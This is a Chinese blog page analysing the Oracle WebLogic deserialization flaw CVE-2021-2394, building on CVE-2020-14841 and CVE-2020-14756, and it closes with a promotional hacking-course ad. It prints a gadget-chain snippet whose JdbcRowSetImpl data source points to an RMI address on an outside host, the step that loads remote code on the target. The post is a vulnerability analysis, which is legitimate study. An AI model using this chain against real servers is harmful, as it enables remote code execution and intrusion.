<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>cve-2021-2394 weblogic反序列化漏洞分析 - IT学习者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="cve-2021-2394 weblogic反序列化漏洞分析" />
<meta property="og:description" content="前几天weblogic
7月例行更新中，修复了一个Rce漏洞。该漏洞性质属于绕过之前的反序列化漏洞补丁。要了解这个漏洞的原因，我们首先要学习其他几个漏洞的原理。
一 weblogic 反序列化绕过指南 本章节只是大概讲解一下如何绕过weblogic反序列化漏洞的补丁。
序列化和反序列化是将一个对象从本机JVM中传输到远程JVM上。在java
序列化的时候，会将对象的类名也写入到传输的数据中。反序列化的时候首先从数据中读取类名，然后通过反射，根据类名去实例化这个对象。类通过实现java.io.Serializable接口可以启用其序列化功能。未实现次接口的类无法使其任何状态序列化或反序列化。可序列化类的所有子类型本身都是可序列化的。序列化接口没有方法或字段，仅用于标识可序列化的语义。
一个类如果想被序列化，那么它可以继承自两个接口，这两个接口的对比如下。
区 别| Serializable| Externalizable—|—|—实现复杂度| 实现简单，Java对其有内建支持| 实现复杂，由开发人员自己完成执行效率| 所有对象由Java统一保存，性能较低| 开发人员决定哪个对象保存，可能造成速度提升保存信息| 保存时占用空间大| 部分存储，可能造成空间减少​而在weblogic的T3协议中，就是用java的序列化协议互相传输对象。为了保证安全性，T3协议的反序列化黑名单中标识哪些类不可以被反序列化。所以weblogic补丁绕过总共有下面几种办法
1.1 黑名单没有覆盖的类 weblogic的开发没有主管能动性，对于安全态度十分消极。只有有人上报CVE，他才会动手加黑名单。否则绝对不会做任何事情。而且对于黑名单经常漏加，造成很多绕过案例。
1.2 利用未经过滤的ObjectInputStream绕过绕过 在之前的公众号讲过，在weblogic中某些类继承自Externalizable接口，在反序列化的时候默认会调用readExternal方法。在该方法中没有使用weblogic提供的带有黑名单过滤功能的FilterInputStream去还原类。而是自作主张，自己使用了没有黑名单过滤的ObjectInputStream去还原对象。造成黑名单根本就没用上，例如CVE-2020-2551
就是这种情况。
当然这只是一个大概，并没有很详细，我们这篇文章的重点不在此。
3. CVE-2020-14841 Jndi注入漏洞 在oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor中，代码如下public Object extract(Object arg0) {if (arg0 == null) {return null;} else {if (arg0 instanceof Wrapper) {arg0 = ((Wrapper)arg0).unwrap();}if (!this.accessor.isInitialized()) {this.accessor.initializeAttributes(arg0.getClass());}return this.accessor.getAttributeValueFromObject(arg0);}}我们可以从代码上看出来，类似与
cve-2020-2555，用法也都是一样的。触发漏洞的重点在于this.accessor.getAttributeValueFromObject
中。对于这个漏洞，我们一般使用MethodAttributeAccessor这个类去触发漏洞
相关代码如下public class MethodAttributeAccessor extends AttributeAccessor {protected String setMethodName = “”;protected String getMethodName;protected transient Method setMethod;protected transient Method getMethod;protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException {try {if (PrivilegedAccessHelper." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://itnewbiea.github.io/posts/44816b0e5708e20247e094b9aa28961b/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-08-10T22:25:39+08:00" />
<meta property="article:modified_time" content="2023-08-10T22:25:39+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="IT学习者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">IT学习者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">cve-2021-2394 weblogic反序列化漏洞分析</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>前几天weblogic<br> 7月例行更新中，修复了一个Rce漏洞。该漏洞性质属于绕过之前的反序列化漏洞补丁。要了解这个漏洞的原因，我们首先要学习其他几个漏洞的原理。</p> 
<h3><a id="_weblogic__3"></a>一 weblogic 反序列化绕过指南</h3> 
<p>本章节只是大概讲解一下如何绕过weblogic反序列化漏洞的补丁。</p> 
<p>序列化和反序列化是将一个对象从本机JVM中传输到远程JVM上。在java<br> 序列化的时候，会将对象的类名也写入到传输的数据中。反序列化的时候首先从数据中读取类名，然后通过反射，根据类名去实例化这个对象。类通过实现java.io.Serializable接口可以启用其序列化功能。未实现次接口的类无法使其任何状态序列化或反序列化。可序列化类的所有子类型本身都是可序列化的。序列化接口没有方法或字段，仅用于标识可序列化的语义。</p> 
<p>一个类如果想被序列化，那么它可以继承自两个接口，这两个接口的对比如下。</p> 
<p>区 别| Serializable| Externalizable—|—|—实现复杂度| 实现简单，Java对其有内建支持| 实现复杂，由开发人员自己完成执行效率| 所有对象由Java统一保存，性能较低| 开发人员决定哪个对象保存，可能造成速度提升保存信息| 保存时占用空间大| 部分存储，可能造成空间减少​而在weblogic的T3协议中，就是用java的序列化协议互相传输对象。为了保证安全性，T3协议的反序列化黑名单中标识哪些类不可以被反序列化。所以weblogic补丁绕过总共有下面几种办法</p> 
<h4><a id="11__14"></a>1.1 黑名单没有覆盖的类</h4> 
<p>weblogic的开发没有主管能动性，对于安全态度十分消极。只有有人上报CVE，他才会动手加黑名单。否则绝对不会做任何事情。而且对于黑名单经常漏加，造成很多绕过案例。</p> 
<h4><a id="12_ObjectInputStream_18"></a>1.2 利用未经过滤的ObjectInputStream绕过绕过</h4> 
<p>在之前的公众号讲过，在weblogic中某些类继承自Externalizable接口，在反序列化的时候默认会调用<code>readExternal</code>方法。在该方法中没有使用weblogic提供的带有黑名单过滤功能的FilterInputStream去还原类。而是自作主张，自己使用了没有黑名单过滤的ObjectInputStream去还原对象。造成黑名单根本就没用上，例如CVE-2020-2551<br> 就是这种情况。</p> 
<p>当然这只是一个大概，并没有很详细，我们这篇文章的重点不在此。</p> 
<h3><a id="3_CVE202014841_Jndi_25"></a>3. CVE-2020-14841 Jndi注入漏洞</h3> 
<p>在<code>oracle.eclipselink.coherence.integrated.internal.cache.LockVersionExtractor</code>中，代码如下public Object extract(Object arg0) {if (arg0 == null) {return null;} else {if (arg0 instanceof Wrapper) {arg0 = ((Wrapper)arg0).unwrap();}if (!this.accessor.isInitialized()) {this.accessor.initializeAttributes(arg0.getClass());}return this.accessor.getAttributeValueFromObject(arg0);}}我们可以从代码上看出来，类似与<br> cve-2020-2555，用法也都是一样的。触发漏洞的重点在于this.accessor.getAttributeValueFromObject<br> 中。对于这个漏洞，我们一般使用MethodAttributeAccessor这个类去触发漏洞</p> 
<p>相关代码如下public class MethodAttributeAccessor extends AttributeAccessor {protected String setMethodName = “”;protected String getMethodName;protected transient Method setMethod;protected transient Method getMethod;protected Object getAttributeValueFromObject(Object anObject, Object[] parameters) throws DescriptorException {try {if (PrivilegedAccessHelper.shouldUsePrivilegedAccess()) {try {return AccessController.doPrivileged(new PrivilegedMethodInvoker(this.getGetMethod(), anObject, parameters));} else {return this.getMethod.invoke(anObject, parameters);}下面我们选取一条Gadget。在反序列化的Gadget中，单纯通过反序列化还原一个类是没有办法触发漏洞，一般都一条链条去触发。所以我们选取下面的cve-2020-14645<br> 的Gadget，代码如下// JdbcRowSetImplJdbcRowSetImpl jdbcRowSet = new JdbcRowSetImpl();jdbcRowSet.setDataSourceName(“rmi://192.168.3.254:8888/xsmd”);MethodAttributeAccessor methodAttributeAccessor = new MethodAttributeAccessor();methodAttributeAccessor.setGetMethodName(“getDatabaseMetaData”);methodAttributeAccessor.setIsWriteOnly(true);methodAttributeAccessor.setAttributeName(“UnicodeSec”);LockVersionExtractor extractor = new LockVersionExtractor(methodAttributeAccessor, “UnicodeSec”);final ExtractorComparator comparator = new ExtractorComparator(extractor);final PriorityQueue queue = new PriorityQueue(2, comparator);Object[] q = new Object[]{jdbcRowSet, jdbcRowSet};Reflections.setFieldValue(queue, “queue”, q);Reflections.setFieldValue(queue, “size”, 2);Field comparatorF = queue.getClass().getDeclaredField(“comparator”);comparatorF.setAccessible(true);comparatorF.set(queue, new ExtractorComparator(extractor));注意，在反序列化Gadget中，必须所有类都可以被反序列化。</p> 
<p>Weblogic的修复思路也比较清奇，只是将LockVersionExtractor与MethodAttributeAccessor类加入到黑名单中。但是LockVersionExtractor旁边还有一个FilterExtractor类，同样可以触发该漏洞，但是weblogic却没有将其加入到黑名单中。这也为cve-2021-2394埋下了伏笔</p> 
<h3><a id="3_cve202014756_36"></a>3. cve-2020-14756分析</h3> 
<p>weblogic<br> 偏偏又搞出一套属于自己的反序列化方案。在coherence包中继承自<code>com.tangosol.io.ExternalizableLite</code>的类同样可以被反序列化。我们看一下<code>com.tangosol.io.ExternalizableLite</code>的具体代码。public interface ExternalizableLite extends Serializable {void readExternal(DataInput var1) throws IOException;void writeExternal(DataOutput var1) throws IOException;}虽然他这个接口也存在readExternal方法，但是方法的参数类型与java.io.Externalizable接口的readExternal方法的参数类型不同。所以对于继承自<code>com.tangosol.io.ExternalizableLite</code>的类，在反序列化的时候并不会主动调用其readExternal方法。而是像继承自java.io.serializable接口的类一样，还原所有属性。</p> 
<p>但是我们要想办法调用<code>com.tangosol.io.ExternalizableLite</code>的readExternal方法，在很多继承自该接口的类中都重写了该方法，而且有很多注入绕过weblogic黑名单的敏感操作。在<code>com.tangosol.coherence.servlet.AttributeHolder</code>类中，java原生的序列化与反序列化默认会调用<code>readExternal(ObjectInput in)</code>方法，恰好又调用了<code>readExternal(DataInput in)</code>方法。方法代码如下，第三行中使用<code>ExternalizableHelper.readObject</code>从流中还原一个对象public void readExternal(DataInput in) throws IOException {this.m_sName = ExternalizableHelper.readUTF(in);this.m_oValue = ExternalizableHelper.readObject(in);this.m_fActivationListener = in.readBoolean();this.m_fBindingListener = in.readBoolean();this.m_fLocal = in.readBoolean();}在<code>ExternalizableHelper.readObject</code>方法中实际调用<code>ExternalizableHelper.readObjectInternal</code>方法去还原一个对象，代码如下<img src="https://images2.imgbox.com/4c/f0/M2g6JyLE_o.jpg" alt="image.png"></p> 
<p>在这里根据对象的类型，调用相关函数去还原。对于继承自<code>com.tangosol.io.ExternalizableLite</code>的类，由readExternalizableLite方法去处理，实例化相关对象后，再调用类的readExtrenal方法。<img src="https://images2.imgbox.com/fc/71/UT2aYsZG_o.jpg" alt="image.png"></p> 
<p>在这里，读取类名将其实例化。在这最关键的一步，缺少了黑名单的过滤。</p> 
<p>weblogic的修复方法也很简单，那就是直接弄个黑名单过滤，代码如下，黑名单其实就是<img src="https://images2.imgbox.com/a3/00/FjwAwl4t_o.jpg" alt="image.png"></p> 
<h3><a id="4_cve20212394__51"></a>4. cve-2021-2394 分析</h3> 
<p>说了上面这两个漏洞，终于可以引出下面这个漏洞了。这个漏洞其实是CVE-2020-14841与cve-2020-14756的结合体。在cve-2020-14841中最为关键的两个类目前已经加入黑名单套餐。其中LockVersionExtractor可以使用FilterExtractor代替。那么MethodAttributeAccessor如何代替。</p> 
<p>答案在<code>oracle.eclipselink.coherence.integrated.internal.cache.SerializationHelper#readAttributeAccessor(java.io.DataInput)</code>中，代码如图。在这个方法中实例化一个MethodAttributeAccessor对象。我们只需要寻找在反序列化过程中是谁调用该方法，即可不通过反序列化去生成MethodAttributeAccessor对象</p> 
<p><img src="https://images2.imgbox.com/af/64/41D6KWZz_o.jpg" alt="image.png"></p> 
<p>巧合的是，FilterExtractor中，正好会通过readAttributeAccessor去还原MethodAttributeAccessor对象。FilterExtractor对象也恰好继承自<code>com.tangosol.io.ExternalizableLite</code>方法。而触发readAttributeAccessor的方法恰好是重写自接口的方法。</p> 
<p>我们只需要通过cve-2020-14756前半部分触发漏洞即可。十分简单，代码如下<img src="https://images2.imgbox.com/7b/f1/hZEF1uU8_o.jpg" alt=""></p> 
<p><img src="https://images2.imgbox.com/0a/d6/jJfSYN02_o.jpg" alt=""></p> 
<p>Jj-1691677528795)]</p> 
<p>[外链图片转存中…(img-R9rrleHt-1691677528795)]</p> 
<h3><a id="_70"></a>最后</h3> 
<p>分享一个快速学习【网络安全】的方法，「也许是」最全面的学习方法：<br> <strong>1、网络安全理论知识（2天）</strong><br> ①了解行业相关背景，前景，确定发展方向。<br> ②学习网络安全相关法律法规。<br> ③网络安全运营的概念。<br> ④等保简介、等保规定、流程和规范。（非常重要）</p> 
<p><strong>2、渗透测试基础（一周）</strong><br> ①渗透测试的流程、分类、标准<br> ②信息收集技术：主动/被动信息搜集、Nmap工具、Google Hacking<br> ③漏洞扫描、漏洞利用、原理，利用方法、工具（MSF）、绕过IDS和反病毒侦察<br> ④主机攻防演练：MS17-010、MS08-067、MS10-046、MS12-20等</p> 
<p><strong>3、操作系统基础（一周）</strong><br> ①Windows系统常见功能和命令<br> ②Kali Linux系统常见功能和命令<br> ③操作系统安全（系统入侵排查/系统加固基础）</p> 
<p><strong>4、计算机网络基础（一周）</strong><br> ①计算机网络基础、协议和架构<br> ②网络通信原理、OSI模型、数据转发流程<br> ③常见协议解析（HTTP、TCP/IP、ARP等）<br> ④网络攻击技术与网络安全防御技术<br> ⑤Web漏洞原理与防御：主动/被动攻击、DDOS攻击、CVE漏洞复现</p> 
<p><strong>5、数据库基础操作（2天）</strong><br> ①数据库基础<br> ②SQL语言基础<br> ③数据库安全加固</p> 
<p><strong>6、Web渗透（1周）</strong><br> ①HTML、CSS和JavaScript简介<br> ②OWASP Top10<br> ③Web漏洞扫描工具<br> ④Web渗透工具：Nmap、BurpSuite、SQLMap、其他（菜刀、漏扫等）</p> 
<p><img src="https://images2.imgbox.com/1e/b5/jPv8vup8_o.png" alt="在这里插入图片描述"></p> 
<p>恭喜你，如果学到这里，你基本可以从事一份网络安全相关的工作，比如渗透测试、Web 渗透、安全服务、安全分析等岗位；如果等保模块学的好，还可以从事等保工程师。薪资区间6k-15k。</p> 
<p>到此为止，大概1个月的时间。你已经成为了一名“脚本小子”。那么你还想往下探索吗？</p> 
<p>想要入坑黑客&amp;网络安全的朋友，给大家准备了一份：282G全网最全的网络安全资料包免费领取！<br> <strong>点【文末卡片】，免费领取</strong></p> 
<p>有了这些基础，如果你要深入学习，可以参考下方这个超详细学习路线图，按照这个路线学习，完全够支撑你成为一名优秀的中高级网络安全工程师：<br> <img src="https://images2.imgbox.com/93/4a/xOuxGnbn_o.png" alt=""></p> 
<p><strong>[高清学习路线图或XMIND文件（点击文末卡片领取）]</strong></p> 
<p><strong>还有一些学习中收集的视频、文档资源，有需要的可以自取：</strong><br> 每个成长路线对应板块的配套视频：<br> <img src="https://images2.imgbox.com/95/34/W2o9IqiC_o.png" alt=""><br> <img src="https://images2.imgbox.com/02/fa/mLmZXCaq_o.png" alt=""><br> 当然除了有配套的视频，同时也为大家整理了各种文档和书籍资料&amp;工具，并且已经帮大家分好类了。<br> <img src="https://images2.imgbox.com/cf/a9/2ROgg3Fg_o.png" alt=""><br> <strong>因篇幅有限，仅展示部分资料，需要的可以【点下方卡片免费领取】</strong></p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2efda33dfb1deb85920bd58ab9de6b8c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">KL散度原理和实现</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8ed6eb68fcfa568be1a87a57856b7882/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Linux平台下搭建GB28181服务器(WVP&#43;ZLMediakit)</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 IT学习者博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://itnewbiea.github.io/js/foot.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>